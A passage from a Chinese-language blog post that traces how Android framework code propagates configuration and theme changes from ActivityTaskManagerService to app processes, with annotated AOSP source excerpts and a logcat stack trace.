class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">updateConfiguration</span><span class="params">(Configuration values)</span> &#123;</span><br><span class="line">    mAmInternal.enforceCallingPermission(CHANGE_CONFIGURATION, <span class="string">&quot;updateConfiguration()&quot;</span>);</span><br><span class="line">    <span class="keyword">synchronized</span> (mGlobalLock) &#123;</span><br><span class="line">        <span class="keyword">if</span> (mWindowManager == <span class="literal">null</span>) &#123;</span><br><span class="line">            Slog.w(TAG, <span class="string">&quot;Skip updateConfiguration because mWindowManager isn&#x27;t set&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (values == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 从窗口管理器获取当前配置</span></span><br><span class="line">            values = mWindowManager.computeNewConfiguration(DEFAULT_DISPLAY);</span><br><span class="line">        &#125;</span><br><span class="line">        mH.sendMessage(PooledLambda.obtainMessage(</span><br><span class="line">                ActivityManagerInternal::updateOomLevelsForDisplay, mAmInternal,</span><br><span class="line">                DEFAULT_DISPLAY));</span><br><span class="line">        <span class="keyword">final</span> <span class="type">long</span> <span class="variable">origId</span> <span class="operator">=</span> Binder.clearCallingIdentity();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (values != <span class="literal">null</span>) &#123;</span><br><span class="line">                Settings.System.clearConfiguration(values);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 重点关注这里。更新配置</span></span><br><span class="line">            updateConfigurationLocked(values, <span class="literal">null</span>, <span class="literal">false</span>, <span class="literal">false</span> <span class="comment">/* persistent */</span>,</span><br><span class="line">                    UserHandle.USER_NULL, <span class="literal">false</span> <span class="comment">/* deferResume */</span>,</span><br><span class="line">                    mTmpUpdateConfigurationResult);</span><br><span class="line">            <span class="keyword">return</span> mTmpUpdateConfigurationResult.changes != <span class="number">0</span>;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            Binder.restoreCallingIdentity(origId);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">boolean</span> <span class="title function_">updateConfigurationLocked</span><span class="params">(Configuration values, ActivityRecord starting,</span></span><br><span class="line"><span class="params">        <span class="type">boolean</span> initLocale, <span class="type">boolean</span> persistent, <span class="type">int</span> userId, <span class="type">boolean</span> deferResume,</span></span><br><span class="line"><span class="params">        ActivityTaskManagerService.UpdateConfigurationResult result)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">changes</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">kept</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">    deferWindowLayout();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (values != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 更新全局配置</span></span><br><span class="line">            changes = updateGlobalConfigurationLocked(values, initLocale, persistent, userId);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!deferResume) &#123;</span><br><span class="line">            <span class="comment">// 更新后确保配置和可见性</span></span><br><span class="line">            kept = ensureConfigAndVisibilityAfterUpdate(starting, changes);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        continueWindowLayout();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (result != <span class="literal">null</span>) &#123;</span><br><span class="line">        result.changes = changes;</span><br><span class="line">        result.activityRelaunched = !kept;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> kept;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里直接看更新 updateGlobalConfigurationLocked() 方法：<br><strong>frameworks/base/services/core/java/com/android/server/wm/ActivityTaskManagerService.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">updateGlobalConfigurationLocked</span><span class="params">(<span class="meta">@NonNull</span> Configuration values, <span class="type">boolean</span> initLocale,</span></span><br><span class="line"><span class="params">        <span class="type">boolean</span> persistent, <span class="type">int</span> userId)</span> &#123;</span><br><span class="line">    <span class="comment">// 省略部分代码......     </span></span><br><span class="line">    SparseArray&lt;WindowProcessController&gt; pidMap = mProcessMap.getPidMap();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> pidMap.size() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">pid</span> <span class="operator">=</span> pidMap.keyAt(i);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">WindowProcessController</span> <span class="variable">app</span> <span class="operator">=</span> pidMap.get(pid);</span><br><span class="line">        ProtoLog.v(WM_DEBUG_CONFIGURATION, <span class="string">&quot;Update process config of %s to new &quot;</span></span><br><span class="line">                + <span class="string">&quot;config %s&quot;</span>, app.mName, mTempConfig);</span><br><span class="line">        <span class="comment">// 通知每个进程配置更改</span></span><br><span class="line">        <span class="comment">// 这句话注释掉 将无法切换主题模式，不管用。</span></span><br><span class="line">        <span class="comment">// 只需要关注这里就行</span></span><br><span class="line">        app.onConfigurationChanged(mTempConfig);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">Message</span> <span class="variable">msg</span> <span class="operator">=</span> PooledLambda.obtainMessage(</span><br><span class="line">            ActivityManagerInternal::broadcastGlobalConfigurationChanged,</span><br><span class="line">            mAmInternal, changes, initLocale);</span><br><span class="line">    mH.sendMessage(msg);</span><br><span class="line">    <span class="comment">// 更新存储的全局配置并通知所有人有关更改。</span></span><br><span class="line">    <span class="comment">// 这里注释了将无法开机，没用任何主题。</span></span><br><span class="line">    mRootWindowContainer.onConfigurationChanged(mTempConfig);</span><br><span class="line">    <span class="keyword">return</span> changes;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述代码跟进去，将会回调 WindowProcessController#onConfigurationChanged()<br><strong>frameworks/base/services/core/java/com/android/server/wm/WindowProcessController.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onConfigurationChanged</span><span class="params">(Configuration newGlobalConfig)</span> &#123;</span><br><span class="line">    <span class="comment">// super 父类 ConfigurationContainer</span></span><br><span class="line">    <span class="built_in">super</span>.onConfigurationChanged(newGlobalConfig);</span><br><span class="line">    updateConfiguration();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着看 ConfigurationContainer#onConfigurationChanged()<br><strong>frameworks/base/services/core/java/com/android/server/wm/ConfigurationContainer.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onConfigurationChanged</span><span class="params">(Configuration newParentConfig)</span> &#123;</span><br><span class="line">    <span class="comment">//临时configuration变量，保存更新之前的mResolvedOverrideConfiguration</span></span><br><span class="line">    mResolvedTmpConfig.setTo(mResolvedOverrideConfiguration);</span><br><span class="line">    <span class="comment">//更新mResolvedOverrideConfiguration，可重写此方法增添特殊配置</span></span><br><span class="line">    resolveOverrideConfiguration(newParentConfig);</span><br><span class="line">    mFullConfiguration.setTo(newParentConfig);</span><br><span class="line">    <span class="comment">// mFullConfiguration 是实际更新后 configuration 的最终状态      </span></span><br><span class="line">    mFullConfiguration.windowConfiguration.unsetAlwaysOnTop();</span><br><span class="line">    <span class="comment">//根据差异更新最终状态:mFullConfiguration</span></span><br><span class="line">    mFullConfiguration.updateFrom(mResolvedOverrideConfiguration);</span><br><span class="line">    <span class="comment">//合并此次修改，保存至mMergedOverrideConfiguration</span></span><br><span class="line">    onMergedOverrideConfigurationChanged();</span><br><span class="line">    <span class="keyword">if</span> (!mResolvedTmpConfig.equals(mResolvedOverrideConfiguration)) &#123;</span><br><span class="line">        <span class="comment">//进入此分支，代表特殊配置修改，通知监听者，</span></span><br><span class="line">        <span class="comment">// 当第三方应用设置和默认系统主题不一样的时候，该位置是应用主动请求</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> mChangeListeners.size() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; --i) &#123;</span><br><span class="line">            mChangeListeners.get(i).onRequestedOverrideConfigurationChanged(</span><br><span class="line">                    mResolvedOverrideConfiguration);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    Log.d(<span class="string">&quot;yeruilai&quot;</span>,<span class="string">&quot;yeruilai：&quot;</span>+mChangeListeners.size());</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> mChangeListeners.size() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; --i) &#123;</span><br><span class="line">        Log.d(<span class="string">&quot;yeruilai&quot;</span>,<span class="string">&quot;yeruilai：&quot;</span>+mChangeListeners.get(i));</span><br><span class="line">        <span class="comment">//通知监听者，已经合并父配置修改</span></span><br><span class="line">        mChangeListeners.get(i).onMergedOverrideConfigurationChanged(</span><br><span class="line">                mMergedOverrideConfiguration);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> getChildCount() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; --i) &#123;</span><br><span class="line">        <span class="comment">//传达configuration最终状态到子类</span></span><br><span class="line">        <span class="comment">// 这个方法也很重要，但目前不清楚作用，注释掉将无法开机，</span></span><br><span class="line">        dispatchConfigurationToChild(getChildAt(i), mFullConfiguration);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里看一个堆栈：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">09-<span class="number">24</span> <span class="number">16</span>:<span class="number">35</span>:<span class="number">18.717</span>  <span class="number">3118</span>  <span class="number">3118</span> D yeruilai  : java.lang.Throwable</span><br><span class="line">09-<span class="number">24</span> <span class="number">16</span>:<span class="number">35</span>:<span class="number">18.717</span>  <span class="number">3118</span>  <span class="number">3118</span> D yeruilai  :      at android.content.res.AssetManager.rebaseTheme(AssetManager.java:<span class="number">1243</span>)</span><br><span class="line">09-<span class="number">24</span> <span class="number">16</span>:<span class="number">35</span>:<span class="number">18.717</span>  <span class="number">3118</span>  <span class="number">3118</span> D yeruilai  :      at android.content.res.ResourcesImpl$ThemeImpl.rebase(ResourcesImpl.java:<span class="number">1457</span>)</span><br><span class="line">09-<span class="number">24</span> <span class="number">16</span>:<span class="number">35</span>:<span class="number">18.717</span>  <span class="number">3118</span>  <span class="number">3118</span> D yeruilai  :      at android.content.res.Resources$Theme.rebase(Resources.java:<span class="number">1874</span>)</span><br><span class="line">09-<span class="number">24</span> <span class="number">16</span>:<span class="number">35</span>:<span class="number">18.717</span>  <span class="number">3118</span>  <span class="number">3118</span> D yeruilai  :      at android.content.res.Resources.setImpl(Resources.java:<span class="number">372</span>)</span><br><span class="line">09-<span class="number">24</span> <span class="number">16</span>:<span class="number">35</span>:<span class="number">18.717</span>  <span class="number">3118</span>  <span class="number">3118</span> D yeruilai  :      at android.app.ResourcesManager.updateResourcesForActivity(ResourcesManager.java:<span class="number">1224</span>)</span><br><span class="line">09-<span class="number">24</span> <span class="number">16</span>:<span class="number">35</span>:<span class="number">18.717</span>  <span class="number">3118</span>  <span class="number">3118</span> D yeruilai  :      at android.app.ResourcesManager.createBaseTokenResources(ResourcesManager.java:<span class="number">867</span>)</span><br><span class="line">09-<span class="number">24</span> <span class="number">16</span>:<span class="number">35</span>:<span class="number">18.717</span>  <span class="number">3118</span>  <span class="number">3118</span> D yeruilai  :      at android.app.ContextImpl.createActivityContext(ContextImpl.java:<span class="number">3148</span>)</span><br><span class="line">09-<span class="number">24</span> <span class="number">16</span>:<span class="number">35</span>:<span class="number">18.717</span>  <span class="number">3118</span>  <span class="number">3118</span> D yeruilai  :      at android.app.ActivityThread.createBaseContextForActivity(ActivityThread.java:<span class="number">3799</span>)</span><br><span class="line">09-<span class="number">24</span> <span class="number">16</span>:<span class="number">35</span>:<span class="number">18.717</span>  <span class="number">3118</span>  <span class="number">3118</span> D yeruilai  :      at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:<span class="number">3605</span>)</span><br><span class="line">09-<span class="number">24</span> <span class="number">16</span>:<span class="number">35</span>:<span class="number">18.717</span>  <span class="number">3118</span>  <span class="number">3118</span> D yeruilai  :      at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:<span class="number">3853</span>)</span><br><span class="line">09-<span class="number">24</span> <span class="number">16</span>:<span class="number">35</span>:<span class="number">18.717</span>  <span class="number">3118</span>  <span class="number">3118</span> D yeruilai  :      at android.app.ActivityThread.handleRelaunchActivityInner(ActivityThread.java:<span class="number">5832</span>)</span><br><span class="line">09-<span class="number">24</span> <span class="number">16</span>:<span class="number">35</span>:<span class="number">18.717</span>  <span class="number">3118</span>  <span class="number">3118</span> D yeruilai  :      at android.app.ActivityThread.handleRelaunchActivity(ActivityThread.java:<span class="number">5723</span>)</span><br><span class="line">09-<span class="number">24</span> <span class="number">16</span>:<span class="number">35</span>:<span class="number">18.717</span>  <span class="number">3118</span>  <span class="number">3118</span> D yeruilai  :      at android.app.servertransaction.ActivityRelaunchItem.execute(ActivityRelaunchItem.java:<span class="number">71</span>)</span><br><span class="line">09-<span class="number">24</span> <span class="number">16</span>:<span class="number">35</span>:<span class="number">18.717</span>  <span class="number">3118</span>  <span class="number">3118</span> D yeruilai  :      at android.app.servertransaction.ActivityTransactionItem.execute(ActivityTransactionItem.java:<span class="number">45</span>)</span><br><span class="line">09-<span class="number">24</span> <span class="number">16</span>:<span class="number">35</span>:<span class="number">18.717</span>  <span class="number">3118</span>  <span class="number">3118</span> D yeruilai  :      at android.app.servertransaction.TransactionExecutor.executeCallbacks(TransactionExecutor.java:<span class="number">135</span>)</span><br><span class="line">09-<span class="number">24</span> <span class="number">16</span>:<span class="number">35</span>:<span class="number">18.717</span>  <span class="number">3118</span>  <span class="number">3118</span> D yeruilai  :      at android.app.servertransaction.TransactionExecutor.execute(TransactionExecutor.java:<span class="number">95</span>)</span><br><span class="line">09-<span class="number">24</span> <span class="number">16</span>:<span class="number">35</span>:<span class="number">18.717</span>  <span class="number">3118</span>  <span class="number">3118</span> D yeruilai  :      at android.app.ActivityThread$H.handleMessage(ActivityThread.java:<span class="number">2345</span>)</span><br><span class="line">09-<span class="number">24</span> <span class="number">16</span>:<span class="number">35</span>:<span class="number">18.717</span>  <span class="number">3118</span>  <span class="number">3118</span> D yeruilai  :      at android.os.Handler.dispatchMessage(Handler.java:<span class="number">106</span>)</span><br><span class="line">09-<span class="number">24</span> <span class="number">16</span>:<span class="number">35</span>:<span class="number">18.717</span>  <span class="number">3118</span>  <span class="number">3118</span> D yeruilai  :      at android.os.Looper.loopOnce(Looper.java:<span class="number">208</span>)</span><br><span class="line">09-<span class="number">24</span> <span class="number">16</span>:<span class="number">35</span>:<span class="number">18.717</span>  <span class="number">3118</span>  <span class="number">3118</span> D yeruilai  :      at android.os.Looper.loop(Looper.java:<span class="number">295</span>)</span><br><span class="line">09-<span class="number">24</span> <span class="number">16</span>:<span class="number">35</span>:<span class="number">18.717</span>  <span class="number">3118</span>  <span class="number">3118</span> D yeruilai  :      at android.app.ActivityThread.main(ActivityThread.java:<span class="number">7941</span>)</span><br><span class="line">09-<span class="number">24</span> <span class="number">16</span>:<span class="number">35</span>:<span class="number">18.717</span>  <span class="number">3118</span>  <span class="number">3118</span> D yeruilai  :      at java.lang.reflect.Method.invoke(Native Method)</span><br><span class="line">09-<span class="number">24</span> <span class="number">16</span>:<span class="number">35</span>:<span class="number">18.717</span>  <span class="number">3118</span>  <span class="number">3118</span> D yeruilai  :      at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:<span class="number">569</span>)</span><br><span class="line">09-<span class="number">24</span> <span class="number">16</span>:<span class="number">35</span>:<span class="number">18.717</span>  <span class="number">3118</span>  <span class="number">3118</span> D yeruilai  :      at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:<span class="number">1015</span>)</span><br></pre></td></tr></table></figure><p>配置改变后通过 binder 调用 IApplicationThread.scheduleTransaction() 方法。<br>留下问题：配置改变后通过 binder 调用，这中间的流程是怎样的？<br>ClientTransaction#schedule()<br><strong>frameworks/base/core/java/android/app/servertransaction/ClientTransaction.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">schedule</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    mClient.scheduleTransaction(<span class="built_in">this</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后配置改变消息会进入应用进程，经过ActivityThread.H发送消息，执行 mTransactionExecutor.execute(transaction)，进入 TransactionExecutor#executeCallbacks() 方法：<br><strong>frameworks/base/core/java/android/app/servertransaction/TransactionExecutor.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@VisibleForTesting</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">executeCallbacks</span><span class="params">(ClientTransaction transaction)</span> &#123;</span><br><span class="line">   </span><br><span class="line">     <span class="comment">// 省略部分代码......   </span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> callbacks.size();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; size; ++i) &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">ClientTransactionItem</span> <span class="variable">item</span> <span class="operator">=</span> callbacks.get(i);</span><br><span class="line">         <span class="comment">// 省略部分代码......   </span></span><br><span class="line">        <span class="comment">// 重点关注这里， </span></span><br><span class="line">        item.execute(mTransactionHandler, token, mPendingActions);</span><br><span class="line">        item.postExecute(mTransactionHandler, token, mPendingActions);</span><br><span class="line">        <span class="comment">// 省略部分代码......     </span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ClientTransactionItem 的实现方法在 ActivityTransactionItem 中，所以进入到 ActivityTransactionItem#execute()<br><strong>frameworks/base/core/java/android/app/servertransaction/ActivityTransactionItem.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">execute</span><span class="params">(ClientTransactionHandler client, IBinder token,</span></span><br><span class="line"><span class="params">        PendingTransactionActions pendingActions)</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">ActivityClientRecord</span> <span class="variable">r</span> <span class="operator">=</span> getActivityClientRecord(client, token);</span><br><span class="line">    <span class="comment">// 抽象方法，在 ActivityRelaunchItem.java 中被实现。</span></span><br><span class="line">    execute(client, r, pendingActions);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ActivityRelaunchItem#execute()<br><strong>frameworks/base/core/java/android/app/servertransaction/ActivityRelaunchItem.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">execute</span><span class="params">(ClientTransactionHandler client, ActivityClientRecord r,</span></span><br><span class="line"><span class="params">        PendingTransactionActions pendingActions)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (mActivityClientRecord == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (DEBUG_ORDER) Slog.d(TAG, <span class="string">&quot;Activity relaunch cancelled&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Trace.traceBegin(Trace.TRACE_TAG_ACTIVITY_MANAGER, <span class="string">&quot;activityRestart&quot;</span>);</span><br><span class="line">    <span class="comment">// 重点关注这里</span></span><br><span class="line">    client.handleRelaunchActivity(mActivityClientRecord, pendingActions);</span><br><span class="line">    Trace.traceEnd(Trace.TRACE_TAG_ACTIVITY_MANAGER);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>后面就不详细分析了；</p><blockquote><p>后续流程：ActivityThread#handleRelaunchActivity() → ActivityThread#handleRelaunchActivityInner() → ActivityThread#handleLaunchActivity() → ActivityThread#performLaunchActivity()→ ActivityThread#createBaseContextForActivity() → ContextImpl #createActivityContext() → ResourcesManager#createBaseTokenResources() → ResourcesManager#updateResourcesForActivity() → Resources #setImpl() → Resources#Theme.rebase() → AssetManager#rebaseTheme()<br>这里注意：在 ActivityThread.java 中有 performActivityConfigurationChanged() 和  performLaunchActivity() 两个方法，都可以更新资源主题，我个人认为一个是配置单独某个应用的，一个是配置全局的。</p></blockquote><p>到此完成应用进程回调。<br>那么系统进程如何传送配置信息到应用进程？<br>这里回到 ActivityTaskManagerService.java。通过ensureConfigAndVisibilityAfterUpdate方法，确保目前启动的activity,重启来加载新的资源<br>ActivityTaskManagerService#ensureConfigAndVisibilityAfterUpdate()<br><strong>frameworks/base/services/core/java/com/android/server/wm/ActivityTaskManagerService.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">boolean</span> <span class="title function_">ensureConfigAndVisibilityAfterUpdate</span><span class="params">(ActivityRecord starting, <span class="type">int</span> changes)</span> &#123;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">kept</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">Task</span> <span class="variable">mainRootTask</span> <span class="operator">=</span> mRootWindowContainer.getTopDisplayFocusedRootTask();</span><br><span class="line">    <span class="comment">// mainRootTask is null during startup.</span></span><br><span class="line">    <span class="keyword">if</span> (mainRootTask != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (changes != <span class="number">0</span> &amp;&amp; starting == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 如果配置改变了，并且调用者还没有在启动一个活动的过程中，</span></span><br><span class="line">            <span class="comment">// 那么找到最上面的活动来检查它的配置是否需要改变</span></span><br><span class="line">            starting = mainRootTask.topRunningActivity();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (starting != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 重点关注这里</span></span><br><span class="line">            kept = starting.ensureActivityConfiguration(changes,</span><br><span class="line">                    <span class="literal">false</span> <span class="comment">/* preserveWindow */</span>);</span><br><span class="line">            mRootWindowContainer.ensureActivitiesVisible(starting, changes,</span><br><span class="line">                    !PRESERVE_WINDOWS);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> kept;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>starting 是 ActivityRecord 对象，所有看 ActivityRecord #ensureActivityConfiguration()<br><strong>frameworks/base/services/core/java/com/android/server/wm/ActivityRecord.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">boolean</span> <span class="title function_">ensureActivityConfiguration</span><span class="params">(<span class="type">int</span> globalChanges, <span class="type">boolean</span> preserveWindow,</span></span><br><span class="line"><span class="params">        <span class="type">boolean</span> ignoreVisibility)</span> &#123;</span><br><span class="line">    <span class="comment">// 省略部分代码......</span></span><br><span class="line">    <span class="keyword">if</span> (changes == <span class="number">0</span> &amp;&amp; !forceNewConfig) &#123;</span><br><span class="line">        ProtoLog.v(WM_DEBUG_CONFIGURATION, <span class="string">&quot;Configuration no differences in %s&quot;</span>,</span><br><span class="line">                <span class="built_in">this</span>);</span><br><span class="line">        <span class="comment">// 不relaunch 时需要去走 scheduleConfigurationChanged让Activity执行onConfiguration的流程</span></span><br><span class="line">        <span class="keyword">if</span> (displayChanged) &#123;</span><br><span class="line">            scheduleActivityMovedToDisplay(newDisplayId, newMergedOverrideConfig);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            scheduleConfigurationChanged(newMergedOverrideConfig);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 省略部分代码......</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>displayChanged未改变的前提下，走 scheduleConfigurationChanged()，通知应用进程。<br>ActivityRecord#scheduleConfigurationChanged<br><strong>frameworks/base/services/core/java/com/android/server/wm/ActivityRecord.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 